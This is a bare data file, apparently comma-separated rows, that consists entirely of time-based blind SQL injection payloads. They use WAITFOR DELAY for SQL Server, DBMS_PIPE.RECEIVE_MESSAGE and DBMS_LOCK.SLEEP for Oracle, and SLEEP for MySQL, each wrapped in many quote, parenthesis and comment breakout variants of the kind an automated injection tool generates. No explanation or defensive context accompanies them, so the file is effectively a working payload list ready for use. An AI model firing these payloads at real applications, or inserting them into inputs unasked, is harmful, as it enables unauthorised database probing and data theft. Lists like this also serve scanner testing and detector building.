) AS KaKw WHERE 5431=5431;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--,1,1
` WHERE 8045=8045;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--,1,1
`) WHERE 2842=2842;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--,1,1
`=``;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--,1,1
"""="""";DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--",1,1
]-(SELECT 0 WHERE 9771=9771;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--,1,1
' IN BOOLEAN MODE);DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--,1,1
);WAITFOR DELAY '0:0:5'-- fFbH,1,1
');WAITFOR DELAY '0:0:5'-- BAxr,1,1
';WAITFOR DELAY '0:0:5'-- lGvL,1,1
""";WAITFOR DELAY '0:0:5'-- MRZn",1,1
);WAITFOR DELAY '0:0:5' AND (2187=2187,1,1
));WAITFOR DELAY '0:0:5' AND ((5781=5781,1,1
)));WAITFOR DELAY '0:0:5' AND (((5821=5821,1,1
;WAITFOR DELAY '0:0:5',1,1
');WAITFOR DELAY '0:0:5' AND ('tkhU'='tkhU,1,1
'));WAITFOR DELAY '0:0:5' AND (('Yzlz'='Yzlz,1,1
')));WAITFOR DELAY '0:0:5' AND ((('ShdT'='ShdT,1,1
';WAITFOR DELAY '0:0:5' AND 'KxXW'='KxXW,1,1
');WAITFOR DELAY '0:0:5' AND ('HLCO' LIKE 'HLCO,1,1
'));WAITFOR DELAY '0:0:5' AND (('PlMO' LIKE 'PlMO,1,1
')));WAITFOR DELAY '0:0:5' AND ((('asRu' LIKE 'asRu,1,1
%';WAITFOR DELAY '0:0:5' AND 'gcUn%'='gcUn,1,1
';WAITFOR DELAY '0:0:5' AND 'ARaQ' LIKE 'ARaQ,1,1
""");WAITFOR DELAY '0:0:5' AND (""ubUk""=""ubUk",1,1
"""));WAITFOR DELAY '0:0:5' AND ((""ozRG""=""ozRG",1,1
""")));WAITFOR DELAY '0:0:5' AND (((""KkjO""=""KkjO",1,1
""";WAITFOR DELAY '0:0:5' AND ""ahDU""=""ahDU",1,1
""");WAITFOR DELAY '0:0:5' AND (""phIb"" LIKE ""phIb",1,1
"""));WAITFOR DELAY '0:0:5' AND ((""Wmks"" LIKE ""Wmks",1,1
""")));WAITFOR DELAY '0:0:5' AND (((""xWag"" LIKE ""xWag",1,1
""";WAITFOR DELAY '0:0:5' AND ""HbFq"" LIKE ""HbFq",1,1
;WAITFOR DELAY '0:0:5'-- nCDh,1,1
;WAITFOR DELAY '0:0:5'# meCz,1,1
';WAITFOR DELAY '0:0:5' OR 'zIaA'='rKUt,1,1
')) AS MlWp WHERE 4804=4804;WAITFOR DELAY '0:0:5'-- thWQ,1,1
""")) AS gDxn WHERE 3524=3524;WAITFOR DELAY '0:0:5'-- jkNc",1,1
)) AS gcnG WHERE 3551=3551;WAITFOR DELAY '0:0:5'-- Xwdj,1,1
') AS LnQD WHERE 6183=6183;WAITFOR DELAY '0:0:5'-- ktHF,1,1
""") AS mOTG WHERE 8365=8365;WAITFOR DELAY '0:0:5'-- SxhG",1,1
) AS naWn WHERE 4612=4612;WAITFOR DELAY '0:0:5'-- Rgxs,1,1
` WHERE 9137=9137;WAITFOR DELAY '0:0:5'-- JyJQ,1,1
`) WHERE 5376=5376;WAITFOR DELAY '0:0:5'-- TuSs,1,1
`=``;WAITFOR DELAY '0:0:5' AND ``=`,1,1
"""="""";WAITFOR DELAY '0:0:5' AND """"=""",1,1
]-(SELECT 0 WHERE 9550=9550;WAITFOR DELAY '0:0:5')|[,1,1
' IN BOOLEAN MODE);WAITFOR DELAY '0:0:5'#,1,1
);DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- CmAF,1,1
');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- uIkJ,1,1
';DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- YGFL,1,1
""";DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- bkdF",1,1
);DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (3534=3534,1,1
));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ((9575=9575,1,1
)));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (((4074=4074,1,1
;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x,1,1
');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ('LMgx'='LMgx,1,1
'));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (('BkZS'='BkZS,1,1
')));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ((('Nkdz'='Nkdz,1,1
';DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND 'YjuD'='YjuD,1,1
');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ('NmoL' LIKE 'NmoL,1,1
'));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (('mPwc' LIKE 'mPwc,1,1
')));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ((('mNah' LIKE 'mNah,1,1
%';DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND 'HCXa%'='HCXa,1,1
';DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND 'osZM' LIKE 'osZM,1,1
""");DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (""jZoQ""=""jZoQ",1,1
"""));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ((""kxLF""=""kxLF",1,1
""")));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (((""DyfB""=""DyfB",1,1
""";DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ""zbaX""=""zbaX",1,1
""");DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (""uJAh"" LIKE ""uJAh",1,1
"""));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ((""DQlc"" LIKE ""DQlc",1,1
""")));DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND (((""kLLB"" LIKE ""kLLB",1,1
""";DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ""ejWN"" LIKE ""ejWN",1,1
;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- zWJg,1,1
;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x# Lpqc,1,1
';DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x OR 'npMY'='GkOx,1,1
')) AS KmEQ WHERE 8853=8853;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- XxSx,1,1
""")) AS qlmR WHERE 2127=2127;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- POnn",1,1
)) AS CQQx WHERE 6457=6457;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- MaIZ,1,1
') AS iWBU WHERE 5993=5993;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- ZNSl,1,1
""") AS lizh WHERE 8050=8050;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- NfiL",1,1
) AS gTeT WHERE 5570=5570;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- SUlh,1,1
` WHERE 6608=6608;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- cHOE,1,1
`) WHERE 3026=3026;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x-- TesO,1,1
`=``;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND ``=`,1,1
"""="""";DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x AND """"=""",1,1
]-(SELECT 0 WHERE 6552=6552;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x)|[,1,1
' IN BOOLEAN MODE);DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x#,1,1
");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
""";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
")));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"'));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"')));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
""");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"""));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
""")));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"')) AS fSDc WHERE 6376=6376;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
""")) AS eVxj WHERE 5125=5125;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
")) AS Rweu WHERE 9098=9098;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"') AS LFBM WHERE 3677=3677;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
""") AS niZN WHERE 9280=9280;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
") AS iwDn WHERE 1578=1578;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"` WHERE 7945=7945;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"`) WHERE 6348=6348;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"`=``;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"""="""";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"]-(SELECT 0 WHERE 9267=9267;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
"' IN BOOLEAN MODE);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(104)||CHR(99)||CHR(83)||CHR(69),5) FROM DUAL--",1,1
");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- QYtM",1,1
"');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- Quur",1,1
"';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- mQcC",1,1
""";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- FpNZ",1,1
");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (5674=5674",1,1
"));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ((8273=8273",1,1
")));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (((3542=3542",1,1
";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL",1,1
"');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ('UGvQ'='UGvQ",1,1
"'));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (('NAho'='NAho",1,1
"')));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ((('AsqK'='AsqK",1,1
"';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND 'sdRu'='sdRu",1,1
"');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ('sGxm' LIKE 'sGxm",1,1
"'));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (('focG' LIKE 'focG",1,1
"')));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ((('liUR' LIKE 'liUR",1,1
"%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND 'CGnX%'='CGnX",1,1
"';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND 'WLNH' LIKE 'WLNH",1,1
""");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (""XYMh""=""XYMh",1,1
"""));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ((""ZNfS""=""ZNfS",1,1
""")));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (((""zrmU""=""zrmU",1,1
""";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ""CPgV""=""CPgV",1,1
""");SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (""fGcl"" LIKE ""fGcl",1,1
"""));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ((""yGPO"" LIKE ""yGPO",1,1
""")));SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND (((""YfFL"" LIKE ""YfFL",1,1
""";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ""cFwC"" LIKE ""cFwC",1,1
";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- jVLY",1,1
";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL# MAJo",1,1
"';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL OR 'vGTw'='ZdOI",1,1
"')) AS ViEF WHERE 3240=3240;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- fOkI",1,1
""")) AS unHF WHERE 5136=5136;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- inLP",1,1
")) AS LRci WHERE 2547=2547;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- Amjk",1,1
"') AS Yemg WHERE 3740=3740;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- YcTy",1,1
""") AS wIIT WHERE 4811=4811;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- Kmaj",1,1
") AS TDIf WHERE 9458=9458;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- KmHI",1,1
"` WHERE 2161=2161;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- BSor",1,1
"`) WHERE 8432=8432;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL-- DNeF",1,1
"`=``;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND ``=`",1,1
"""="""";SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL AND """"=""",1,1
"]-(SELECT 0 WHERE 3579=3579;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL)|[",1,1
"' IN BOOLEAN MODE);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(122)||CHR(116)||CHR(66),5) FROM DUAL#",1,1
);BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
');BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
';BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
""";BEGIN DBMS_LOCK.SLEEP(5); END--",1,1
));BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
)));BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
'));BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
')));BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
%';BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
""");BEGIN DBMS_LOCK.SLEEP(5); END--",1,1
"""));BEGIN DBMS_LOCK.SLEEP(5); END--",1,1
""")));BEGIN DBMS_LOCK.SLEEP(5); END--",1,1
')) AS PInO WHERE 5382=5382;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
""")) AS cTYQ WHERE 9616=9616;BEGIN DBMS_LOCK.SLEEP(5); END--",1,1
)) AS Nqsx WHERE 4431=4431;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
') AS qTjf WHERE 5898=5898;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
""") AS aDCQ WHERE 9058=9058;BEGIN DBMS_LOCK.SLEEP(5); END--",1,1
) AS NJBB WHERE 9668=9668;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
` WHERE 3989=3989;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
`) WHERE 7257=7257;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
`=``;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
"""="""";BEGIN DBMS_LOCK.SLEEP(5); END--",1,1
]-(SELECT 0 WHERE 5904=5904;BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
' IN BOOLEAN MODE);BEGIN DBMS_LOCK.SLEEP(5); END--,1,1
);BEGIN DBMS_LOCK.SLEEP(5); END-- vBLm,1,1
');BEGIN DBMS_LOCK.SLEEP(5); END-- HSLx,1,1
';BEGIN DBMS_LOCK.SLEEP(5); END-- ezPK,1,1
""";BEGIN DBMS_LOCK.SLEEP(5); END-- THzb",1,1
);BEGIN DBMS_LOCK.SLEEP(5); END AND (6333=6333,1,1
));BEGIN DBMS_LOCK.SLEEP(5); END AND ((1518=1518,1,1
)));BEGIN DBMS_LOCK.SLEEP(5); END AND (((2477=2477,1,1
;BEGIN DBMS_LOCK.SLEEP(5); END,1,1
');BEGIN DBMS_LOCK.SLEEP(5); END AND ('IaCJ'='IaCJ,1,1
'));BEGIN DBMS_LOCK.SLEEP(5); END AND (('AKlT'='AKlT,1,1
')));BEGIN DBMS_LOCK.SLEEP(5); END AND ((('yBAj'='yBAj,1,1
';BEGIN DBMS_LOCK.SLEEP(5); END AND 'Yrku'='Yrku,1,1
');BEGIN DBMS_LOCK.SLEEP(5); END AND ('edzU' LIKE 'edzU,1,1
'));BEGIN DBMS_LOCK.SLEEP(5); END AND (('HALV' LIKE 'HALV,1,1
')));BEGIN DBMS_LOCK.SLEEP(5); END AND ((('cOkk' LIKE 'cOkk,1,1
%';BEGIN DBMS_LOCK.SLEEP(5); END AND 'fNTr%'='fNTr,1,1
';BEGIN DBMS_LOCK.SLEEP(5); END AND 'kyNv' LIKE 'kyNv,1,1
""");BEGIN DBMS_LOCK.SLEEP(5); END AND (""nGhg""=""nGhg",1,1
"""));BEGIN DBMS_LOCK.SLEEP(5); END AND ((""WeCk""=""WeCk",1,1
""")));BEGIN DBMS_LOCK.SLEEP(5); END AND (((""xlSm""=""xlSm",1,1
""";BEGIN DBMS_LOCK.SLEEP(5); END AND ""aeZu""=""aeZu",1,1
""");BEGIN DBMS_LOCK.SLEEP(5); END AND (""xIhk"" LIKE ""xIhk",1,1
"""));BEGIN DBMS_LOCK.SLEEP(5); END AND ((""Moqd"" LIKE ""Moqd",1,1
""")));BEGIN DBMS_LOCK.SLEEP(5); END AND (((""gVlL"" LIKE ""gVlL",1,1
""";BEGIN DBMS_LOCK.SLEEP(5); END AND ""TdOC"" LIKE ""TdOC",1,1
;BEGIN DBMS_LOCK.SLEEP(5); END-- bOtP,1,1
;BEGIN DBMS_LOCK.SLEEP(5); END# tpTA,1,1
';BEGIN DBMS_LOCK.SLEEP(5); END OR 'vjXu'='aNad,1,1
')) AS vqBO WHERE 8557=8557;BEGIN DBMS_LOCK.SLEEP(5); END-- uaAm,1,1
""")) AS tLgj WHERE 4648=4648;BEGIN DBMS_LOCK.SLEEP(5); END-- xKxc",1,1
)) AS pSEq WHERE 9371=9371;BEGIN DBMS_LOCK.SLEEP(5); END-- ITFs,1,1
') AS HJzq WHERE 2849=2849;BEGIN DBMS_LOCK.SLEEP(5); END-- xCdJ,1,1
""") AS Ofid WHERE 7721=7721;BEGIN DBMS_LOCK.SLEEP(5); END-- UMIh",1,1
) AS ESeR WHERE 9178=9178;BEGIN DBMS_LOCK.SLEEP(5); END-- kRAE,1,1
` WHERE 8343=8343;BEGIN DBMS_LOCK.SLEEP(5); END-- mmzB,1,1
`) WHERE 2540=2540;BEGIN DBMS_LOCK.SLEEP(5); END-- sCRz,1,1
`=``;BEGIN DBMS_LOCK.SLEEP(5); END AND ``=`,1,1
"""="""";BEGIN DBMS_LOCK.SLEEP(5); END AND """"=""",1,1
]-(SELECT 0 WHERE 5730=5730;BEGIN DBMS_LOCK.SLEEP(5); END)|[,1,1
' IN BOOLEAN MODE);BEGIN DBMS_LOCK.SLEEP(5); END#,1,1
) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- oAnN,1,1
') AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- kksg,1,1
' AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- Cduc,1,1
""" AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- fYnQ",1,1
) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (2881=2881,1,1
)) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ((7624=7624,1,1
))) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (((6315=6315,1,1
 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp),1,1
') AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ('nbsV'='nbsV,1,1
')) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (('VZqA'='VZqA,1,1
'))) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ((('sfZO'='sfZO,1,1
' AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND 'xrzl'='xrzl,1,1
') AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ('TZmM' LIKE 'TZmM,1,1
')) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (('NVWz' LIKE 'NVWz,1,1
'))) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ((('sXgz' LIKE 'sXgz,1,1
%' AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND 'QjsC%'='QjsC,1,1
' AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND 'rIws' LIKE 'rIws,1,1
""") AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (""oYQE""=""oYQE",1,1
""")) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ((""Nnpg""=""Nnpg",1,1
"""))) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (((""Icxc""=""Icxc",1,1
""" AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ""OGFY""=""OGFY",1,1
""") AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (""OPpy"" LIKE ""OPpy",1,1
""")) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ((""hZaA"" LIKE ""hZaA",1,1
"""))) AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND (((""tTkX"" LIKE ""tTkX",1,1
""" AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp) AND ""caEy"" LIKE ""caEy",1,1
 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)-- bYvO,1,1
 AND (SELECT 2239 FROM (SELECT(SLEEP(5)))jYXp)# uHXK,1,1
